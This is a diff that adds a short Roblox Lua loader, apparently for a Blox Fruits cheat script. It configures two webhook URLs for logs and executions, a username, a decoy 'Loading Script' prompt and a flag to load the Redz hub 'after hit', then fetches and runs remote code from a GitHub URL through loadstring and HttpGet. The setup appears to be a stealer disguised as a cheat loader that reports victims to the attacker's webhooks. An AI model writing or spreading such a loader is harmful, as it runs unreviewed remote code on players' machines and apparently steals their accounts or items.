@@ -1,0 +1,8 @@
+LogsWebhook = "https://webhook-protect.vercel.app/api/webhook?id=NkVHd2xaaG9qY0J0dnVaTWtBa3JsUTplLUliTENQMDJ2WFE1c0dWVUVST3RrbHhGMzA1YThBNU94dDJ6U3R3eERGeThpZGx5OVJyS1FwQmY0VkRRRW9iT0ZSZF9uUWFjMW1GZzFlZkxwdGRMcUdNV3dzc3RCeUtnNWY2RlNxc0NXU0JoX0lNdV9FMU5SWEh5bFV0bThGaGJqMjBnd09LZWZ2aEY0RnVxY2trNUhNNmVGSFNPT2hSaGY4YTFheWdTVVE"
+ExecutionWebhook = "https://webhook-protect.vercel.app/api/webhook?id=d200SUtYVzhjeUNoRUNGQW5Ham1IZzpVTldCNHZDWDZDUlNaS0NZWGJnS0pEcnI1WlBKd3ZxTWhjZkpYeEVZdjRFZEpNaEJEbi10VUNqYVRFbWFscm9vaUxpLUZKbW9CYVZVRXVSTWFLREp1TUVXSWVYd1lZcHRyaHpXSnN1alI5RldMMjBwRlZMYUpkYUlwRFFlYnM5NV90RkIyMlE0LWZGUXlYQlJXdHBjYnByZkdKMnkzeEgtSVlyYWgydnMyWFk"
+Username = "HTNTPbloxfruit"
+PromptText = "Loading Script"
+RandomizedPrompt = true
+LoadRedzAfterHit = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrubGrub2/coding/refs/heads/main/Script"))()
